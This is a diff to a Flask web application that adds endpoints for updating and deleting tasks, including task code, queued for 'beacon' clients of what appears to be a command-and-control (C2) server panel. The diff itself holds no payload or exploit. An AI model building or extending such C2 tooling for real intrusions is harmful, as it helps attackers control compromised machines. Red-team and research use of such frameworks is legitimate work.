@@ -627,6 +627,31 @@ def register(app):
             return jsonify({"ok": False, "error": "C2 未启用"}), 400
         return jsonify({"ok": True, "tasks": c2_bridge.task_list(client_id)})
 
+    @app.route("/api/c2/task/update", methods=["POST"])
+    @login_required
+    def c2_task_update():
+        if not _ensure_c2():
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        client_id = str(data.get("client_id", ""))
+        task_id = str(data.get("task_id", ""))
+        code = str(data.get("code", ""))
+        if not client_id or not task_id:
+            return jsonify({"ok": False, "error": "client_id/task_id 必填"}), 400
+        return jsonify(c2_bridge.task_update(client_id, task_id, code=code))
+
+    @app.route("/api/c2/task/delete", methods=["POST"])
+    @login_required
+    def c2_task_delete():
+        if not _ensure_c2():
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        client_id = str(data.get("client_id", ""))
+        task_id = str(data.get("task_id", ""))
+        if not client_id or not task_id:
+            return jsonify({"ok": False, "error": "client_id/task_id 必填"}), 400
+        return jsonify(c2_bridge.task_delete(client_id, task_id))
+
     @app.route("/api/c2/beacon/<client_id>/remark", methods=["GET", "POST"])
     @login_required
     def c2_beacon_remark(client_id: str):
